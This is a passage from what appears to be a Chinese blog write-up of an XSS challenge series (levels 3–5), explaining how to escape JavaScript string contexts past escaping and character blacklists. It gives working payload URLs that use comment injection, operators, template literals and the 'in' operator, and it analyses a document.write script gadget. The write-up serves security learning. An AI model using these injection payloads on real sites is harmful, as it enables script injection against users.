rel="noopener">htmlspecialchars()</a>该函数的默认配置不转换单引号</p></blockquote><p>先尝试构造出一个合法的js上下文环境进行弹框，比如<code>&#39;;alert(1);//</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//此处语法合规</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">''</span>;alert(<span class="number">1</span>);<span class="comment">//';</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//此处语法报错</span></span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">''</span>;alert(<span class="number">1</span>);<span class="comment">//');</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再把下边这个也弄合规，比如<code>&#39;);alert(1);//</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//语法错误</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">''</span>);alert(<span class="number">1</span>);<span class="comment">//';</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//语法正确</span></span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">''</span>);alert(<span class="number">1</span>);<span class="comment">//');</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为语句环境的不通确实无法两全其美，无解。</p><h3 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h3><p>因为上下文两处输出位置，会想到使用多行注释进行多行注释，破坏当前语言结构来进行构造。在js中多行注释：</p><ul><li><code>/* xx */</code>：常见的js多行注释</li><li><code>&lt;!-- xxx --&gt;</code>：这个虽然实际上是HTML注释，本以为可以使用，但是并不可以。<ul><li><code>&lt;!--</code>在谷歌浏览器和火狐浏览器中经过测试是等同于<code>//</code></li><li><code>--&gt;</code>不受支持</li></ul></li></ul><p>尝试破坏语法结构，主要思路就是注释掉两个反射点中间的语法部分，然后自主重构js：</p><p>第一处需要把</p><ol><li><code>*/</code>放到字符串里取消注释作用</li><li>闭合前面语句</li><li>开始<code>/*</code></li></ol><p>第二处</p><ol><li>需要先引入<code>*/</code>，把前边代码注释</li><li>自主插入js处理后面的对应结构</li><li>写入弹框语句即自定义语句</li><li>再把<code>/*</code>关进字符串里，取消注释作用</li><li>最后处理后面的尾巴。</li></ol><p>直接上payload：<code>*/if(true){alert(1);var a=&#39;;/*&#39;;//</code></p><p>拆解一下payload每一个部分的作用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*<span class="regexp">/</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/注释两个插入点中间的代码</span></span><br><span class="line"><span class="regexp">if(true)&#123;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/为了引入一个&#123;来对应之后的&#125;结构</span></span><br><span class="line"><span class="regexp">alert(1);</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/自主js随便写</span></span><br><span class="line"><span class="regexp">var a='</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/为了在反射点2把/</span>*关进字符串，引入一个变量</span><br><span class="line"><span class="comment">//同时也是闭合反射点1的字符串</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">//为了在反射点1的语法正确</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//注释反射点2后面的为尾巴</span></span><br></pre></td></tr></table></figure><p>最后页面如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">'*/if(true)&#123;alert(1);var a='</span>;<span class="comment">/*';//';</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">'*/if(true)&#123;alert(1);var a='</span>;<span class="comment">/*';//');</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然也可以精简一下<code>var a=</code>这一部分payload：</p><p><code>http://px1624.sinaapp.com/test/xsstest3/?px=*/if(true){alert(1);%27;/*%27;//</code></p><p>还可以精简一下<code>if(true):</code>语句，神奇的大括号闭合同样不会报错：</p><p><code>http://px1624.sinaapp.com/test/xsstest3/?px=*/{alert(1);%27;/*%27;//</code></p><p>再偷工减料，废物利用下，得到最后12个字符的writeup，（这样就不弹1了）：</p><p><code>http://px1624.sinaapp.com/test/xsstest3/?px=*/{alert(%27/*</code></p><h3 id="使用运算符（官方解法）"><a href="#使用运算符（官方解法）" class="headerlink" title="使用运算符（官方解法）"></a>使用运算符（官方解法）</h3><p><code>&#39;-alert(1)-&#39;</code>一开始是没有想到有这种解法的，但是再看完writeup之后，发现这就是XRAY常见的js中的xss payload。</p><p>知识点：</p><ul><li>js中的运算符拼接可以执行语句</li></ul><p>writeup：<code>http://px1624.sinaapp.com/test/xsstest3/?px=%27-alert(1)-%27</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">''</span>-alert(<span class="number">1</span>)-<span class="string">''</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">''</span>-alert(<span class="number">1</span>)-<span class="string">''</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>前后闭合单引号<code>&#39;</code>，中间使用运算符连接<code>-</code>（可以使用<code>*,+,-,\</code>等等），再写入js函数<code>alert(1)</code>可以成功调用。</p><blockquote><p>关于这里能够适配的js函数，目前实验出来是已有的函数调用都可以使用</p><p>比如<code>window.open(&#39;http://www.baidu.com&#39;)</code></p></blockquote><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest4/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest4/</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 4~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>多点同步输出的注释使用</li><li>模板字符串具有类似跨行注释的特性</li><li>不被注意到的更多的运算符</li></ul><p>其实代码还是一模一样，但是服务端过滤规则变化了，不再是对输出字符转义了，而是针对特定字符直接黑名单。</p><p>可以使用<code>%00-%ff</code>进行字符测试，看看哪些字符被ban了。省事直接取官方WP的中源码的黑名单列表：<code>&lt;&gt;+_*/&amp;|~^%!?=</code></p><p>回顾之前的思路：</p><ul><li><p>使用运算符：运算符连接表达式来执行JS，但是由于算数运算符<code>+-*/%</code>都被ban了，无法使用</p></li><li><p>使用注释：我们之前使用的是<code>/*..*/</code>，由于*也被ban了，无法使用</p></li></ul><p>看似我们又回到了之前的顾头不顾尾的处境中。</p><p>在使用注释的思路中，我们是要将两个注入点中间的代码无意义化，破坏上下文结构从而写入自己的代码完成闭合。实际上除了注释，还有其他形式的结构可以实现这样的功能：<strong>字符串</strong>，将代码当作字符串。</p><p>在js中我们知道其实双引号（”）其实是支持多行字符组成字符串的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a =<span class="string">"123\</span></span><br><span class="line"><span class="string">456\</span></span><br><span class="line"><span class="string">789"</span>;</span><br><span class="line"><span class="comment">//a</span></span><br><span class="line"><span class="string">"123456789"</span></span><br></pre></td></tr></table></figure><p>但是这需要每一行字符的后缀加上<code>\</code>，在当前场景下不可能。</p><p>除此之外，JS中也存在可以容纳换行的字符串结构：<strong>模板字符串</strong></p><h3 id="注释进阶：使用模板字符串"><a href="#注释进阶：使用模板字符串" class="headerlink" title="注释进阶：使用模板字符串"></a>注释进阶：使用模板字符串</h3><p><strong>模板字符串</strong>使用反引号来代替普通字符串中的用双引号和单引号。模板字符串可以包含特定语法（<code>${expression}</code>）的占位符。</p><ul><li>多行字符串：不同于单引号双银行，模板字符串可以包含换行（也是我们这题要使用到的特性）</li><li><code>$(表达式)</code>：可以在模板字符串中使用该形式引入简单表达式</li><li>带上标签（tag）的模板字符串：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.可以包含换行符</span></span><br><span class="line"><span class="keyword">var</span> a=<span class="string">`123</span></span><br><span class="line"><span class="string">456`</span>;</span><br><span class="line"><span class="comment">//2.使用表达式,类似于在字符串中使用运算符的情况</span></span><br><span class="line"><span class="keyword">var</span> a=(<span class="string">`123<span class="subst">$&#123;alert(<span class="number">1</span>)&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//3.定义函数、使用标签执行函数，并传参</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTag</span>(<span class="params">strings, personExp, ageExp</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> str0 = strings[<span class="number">0</span>]; <span class="comment">// "that "</span></span><br><span class="line">  <span class="keyword">var</span> str1 = strings[<span class="number">1</span>]; <span class="comment">// " is a "</span></span><br><span class="line">  <span class="keyword">return</span> str0 + personExp + str1 + ageExp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">28</span>;</span><br><span class="line"><span class="keyword">var</span> output = myTag<span class="string">`that <span class="subst">$&#123; person &#125;</span> is a <span class="subst">$&#123; age &#125;</span>`</span>;</span><br><span class="line"><span class="built_in">console</span>.log(output);</span><br><span class="line"><span class="comment">// that Mike is a youngster</span></span><br></pre></td></tr></table></figure><p>带入我们题目的场景，我们需要把模板字符串拆成前后脸两部分，<code>A反引号B</code>：</p><ul><li>A部分是为了满足前面插入点语句的闭合；在前面语句中，B部分变为了字符串不用理会</li><li>B部分是为了满足后面插入点语句的闭合；在后面语句中，A部分变味了字符串不用理会</li></ul><p>那么只需要各自构造然后拼接就可以了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> px = <span class="string">''</span>;</span><br><span class="line"><span class="comment">// A部分需要闭合一个'、一个;</span></span><br><span class="line"><span class="comment">//';</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//B部分需要给模板字符串一个分号作为结束</span></span><br><span class="line"><span class="comment">//后面还需要闭合一个'、一个)、一个&#125;</span></span><br></pre></td></tr></table></figure><p>老老实实构造一个if语句的poc：<code>http://px1624.sinaapp.com/test/xsstest4/?px=%27;反引号;if(1){alert(%27</code>(由于MARKDOWN会吞反引号，用中文代替)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> px = <span class="string">''</span>;<span class="string">`;if(1)&#123;alert('';</span></span><br><span class="line"><span class="string">if (px != "") &#123;</span></span><br><span class="line"><span class="string">$('xss').val('';`</span>;<span class="keyword">if</span>(<span class="number">1</span>)&#123;alert(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后开始利用浏览器特性开始偷，就是慢慢删、不报错就可以，writeup1：</p><p><code>http://px1624.sinaapp.com/test/xsstest4/?px=%27;反引号;{alert(%27</code>（13个字符gainover解法）</p><p>由于当前有JQuery环境，还可以利用之前提到的<code>$(alert(1))</code>来弹框，writeup2：</p><p><code>http://px1624.sinaapp.com/test/xsstest4/?px=%27;反引号;{$(alert(1),%27</code></p><h3 id="运算符进阶：更多的运算符"><a href="#运算符进阶：更多的运算符" class="headerlink" title="运算符进阶：更多的运算符"></a>运算符进阶：更多的运算符</h3><p>之前分析看似不行的道路实际上都还有骚操作，深刻教训：<strong>查文档请查<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference" target="_blank" rel="noopener">开发者文档</a></strong></p><p>除了我们知道的一些常见的运算符号，还有一些少用的运算符比如<code>in</code>、<code>instanceof</code>。</p><p><code>&#39;&#39; in alert(1)</code>在漏洞构造的时候 虽然由于数据类型不正确，执行会不成功，但是语法是正确的，同时由于先执行函数，然后再处理关系运行符的执行顺序，可以正确执行弹框语句。</p><p><code>&#39;in alert(1) in&#39;</code>writeup：<code>http://px1624.sinaapp.com/test/xsstest4/?px=%27in%20alert(1)%20in%27</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> px = <span class="string">''</span><span class="keyword">in</span> alert(<span class="number">1</span>) <span class="keyword">in</span><span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span><br><span class="line">$(<span class="string">'xss'</span>).val(<span class="string">''</span><span class="keyword">in</span> alert(<span class="number">1</span>) <span class="keyword">in</span><span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>罗列个运算符标识符清单：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">in</span></span><br><span class="line"><span class="keyword">instanceof</span></span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br><span class="line">&amp;</span><br><span class="line">|</span><br><span class="line">^</span><br><span class="line">+</span><br><span class="line">-</span><br><span class="line">/</span><br><span class="line">*</span><br><span class="line">%</span><br><span class="line"><span class="keyword">delete</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="keyword">typeof</span></span><br><span class="line">~</span><br><span class="line">!</span><br></pre></td></tr></table></figure><h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest5/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/</a></p><p>知识点：</p><ul><li>script标签的src</li><li>js基本函数</li></ul><p>访问后会发现地址栏直接传到：<a href="http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass</a>~</p><p>在这个页面测试，callback参数无论输入什么都会返回对应的内容，可以写入alert之类的弹框语句，但是这边并不会构成xss。</p><p>因为返回的内容体是<code>Content-Type: text/javascript</code>，这个内容类型跟<code>application/json</code>之类的类似，都是不会被浏览器按照html解析的。所以一定什么地方我们有疏漏。</p><p>我们清空浏览器缓存，抓取数据包的的话会发现实际上这里会有一个跳转行为，访问<code>view-source:http://px1624.sinaapp.com/test/xsstest5/</code>可以查看默认页面的js源码逻辑。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> pagenum= $.Tjs_Get(<span class="string">'pn'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback=Give me xss bypass~"</span>;</span></span><br><span class="line"><span class="xml">document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'"</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>');</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Give me xss bypass 5~</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>引入了一个index.js作为库函数使用，<code>$.Tjs_Get</code>正是其中的方法（会解析出对应GET参数），我们可以到内部去看其逻辑，之后分析。</p></li><li><p>如果orguin的内容小于=0 就会跳转（就是我们默认访问跳转的情况）</p><p>不然的话会像当前页面写入一个script标签，其内容是当前网站的某个页面的内容（我们可以控制相对路径和参数）</p></li></ol><p>比较明显，我们的目标就是传入<code>uin参数</code>和<code>pn参数</code>，绕过跳转，再利用<code>document.write</code>来引入一个存在payload的页面。作为script解析。</p><p>先来看看我们传入的参数收到了怎么样的解析：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Tjs_Get:<span class="function"><span class="keyword">function</span>(<span class="params">parmtname</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//在url地址中找到&amp;和#的位置</span></span><br><span class="line">    <span class="keyword">var</span> sl = location.href.indexOf(<span class="string">'&amp;'</span>);</span><br><span class="line">    <span class="keyword">var</span> hl = location.href.indexOf(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">//没有&amp;参数分割字符并且有#锚点字符，或者&amp;字符在锚点#之后并且有#锚点字符</span></span><br><span class="line">    <span class="comment">//就开始解析#锚点之后的参数</span></span><br><span class="line">    <span class="keyword">if</span> ((sl &lt; <span class="number">0</span> || sl &gt; hl) &amp;&amp; hl &gt; <span class="number">0</span>) str = location.hash.substr(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//否则解析get参数</span></span><br><span class="line">    <span class="keyword">else</span> str = location.search.substr(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//waf1：过滤%，置换为空</span></span><br><span class="line">    str=str.replace(<span class="regexp">/%/g</span>,<span class="string">""</span>);</span><br><span class="line">    <span class="comment">//清空包括?之前的字符，做一个html编码</span></span><br><span class="line">    <span class="keyword">var</span> SERVER_TEMP= $.Tjs_HtmlEncode(str.replace(<span class="regexp">/.*\?/</span>,<span class="string">""</span>)); <span class="comment">//HtmlEncode 进行安全验证</span></span><br><span class="line">    <span class="comment">//get参数按照&amp;分割，读取参数名跟我们输出的参数名比对</span></span><br><span class="line">    <span class="comment">//如果一样就获取值</span></span><br><span class="line">    <span class="keyword">var</span> PAGE_PARMT_ARRAY= SERVER_TEMP.split(<span class="string">"&amp;amp;"</span>);</span><br><span class="line">    <span class="keyword">if</span>(PAGE_PARMT_ARRAY.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> value=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;PAGE_PARMT_ARRAY.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(PAGE_PARMT_ARRAY[i]==<span class="string">""</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">var</span> GETname = PAGE_PARMT_ARRAY[i].substr(<span class="number">0</span>,PAGE_PARMT_ARRAY[i].indexOf(<span class="string">"="</span>));</span><br><span class="line">        <span class="keyword">if</span>(GETname == parmtname)&#123;</span><br><span class="line">            value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf(<span class="string">"="</span>)+<span class="number">1</span>),PAGE_PARMT_ARRAY[i].length);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ol><li>分情况解析?之后的参数或者是#之后的参数</li><li><code>%</code>被过滤为空</li><li>包括<code>?</code>之前的字符会被清空不被解析（经过测试为贪婪匹配即最后一个?为准）</li><li>假如出现两个相同的参数名的参数，根据实现逻辑会取第一个的值</li></ol><p>简单瞅一下自实现的js加密<code>Tjs_HtmlEncode</code>:正常的html编码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Tjs_HtmlEncode:<span class="function"><span class="keyword">function</span> (<span class="params">sStr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sStr = sStr.replace(<span class="regexp">/&amp;/g</span>,<span class="string">"&amp;amp;"</span>);</span><br><span class="line">    sStr = sStr.replace(<span class="regexp">/&gt;/g</span>,<span class="string">"&amp;gt;"</span>);</span><br><span class="line">    sStr = sStr.replace(<span class="regexp">/&lt;/g</span>,<span class="string">"&amp;lt;"</span>);</span><br><span class="line">    sStr = sStr.replace(<span class="regexp">/"/g</span>,<span class="string">"&amp;quot;"</span>);</span><br><span class="line">    sStr = sStr.replace(<span class="regexp">/'/g</span>,<span class="string">"&amp;#39;"</span>);</span><br><span class="line">    <span class="keyword">return</span> sStr;</span><br><span 